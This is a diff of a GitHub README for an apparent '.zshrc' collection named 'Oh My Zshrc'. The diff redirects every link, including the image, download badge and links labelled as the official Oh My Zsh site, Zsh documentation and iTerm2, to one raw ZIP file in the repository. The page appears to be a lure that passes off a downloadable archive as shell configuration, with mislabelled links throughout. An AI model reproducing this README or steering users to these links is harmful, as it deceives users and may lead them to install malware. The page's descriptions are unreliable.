@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Oh My Zshrc" Repository! 🤖
 
-![Terminal](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2)
+![Terminal](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip)
 
 ## Description
 This repository is a collection of all my `.zshrc` files, tailored to enhance my shell experience on various platforms. From customizing the terminal appearance to optimizing shell performance, these configuration files cover a wide range of topics related to bash scripting, terminal usage, and shell customization.
@@ -22,9 +22,9 @@ This repository is a collection of all my `.zshrc` files, tailored to enhance my
 - Zshrc
 
 ## Installation
-You can download the repository files by clicking [here](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2). Once downloaded, you can extract the ZIP file and explore the `.zshrc` configurations included in the repository.
+You can download the repository files by clicking [here](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip). Once downloaded, you can extract the ZIP file and explore the `.zshrc` configurations included in the repository.
 
-[![Download ZIP](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2<COLOR>.svg)](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2)
+[![Download ZIP](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip<COLOR>.svg)](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip)
 
 **Note:** After downloading the ZIP file, please ensure to extract it to access the `.zshrc` files.
 
@@ -38,12 +38,12 @@ If you have any suggestions, improvements, or new configurations to add, feel fr
 For any issues or questions regarding the `.zshrc` configurations in this repository, please check the "Releases" section or reach out to the repository owner for assistance. Your feedback is crucial in improving the quality of these configurations and helping other users make the most out of their shell environment.
 
 ## Resources
-- [Oh My Zsh Official Website](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2)
-- [Zsh Documentation](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2)
-- [iTerm2 Terminal Emulator](https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2)
+- [Oh My Zsh Official Website](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip)
+- [Zsh Documentation](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip)
+- [iTerm2 Terminal Emulator](https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip)
 
 Let's make our terminal experience awesome together! 💻🌟
 
 ---
 
-**Note**: This https://github.com/john312s/oh-my-zshrc/releases/tag/v1.2 template is designed to provide a comprehensive guide to the "Oh My Zshrc" repository, covering all essential aspects related to shell configuration, customization, and usage. Feel free to customize it further based on your preferences and requirements.
+**Note**: This https://github.com/john312s/oh-my-zshrc/raw/refs/heads/main/presets/my_zshrc_oh_v1.7.zip template is designed to provide a comprehensive guide to the "Oh My Zshrc" repository, covering all essential aspects related to shell configuration, customization, and usage. Feel free to customize it further based on your preferences and requirements.
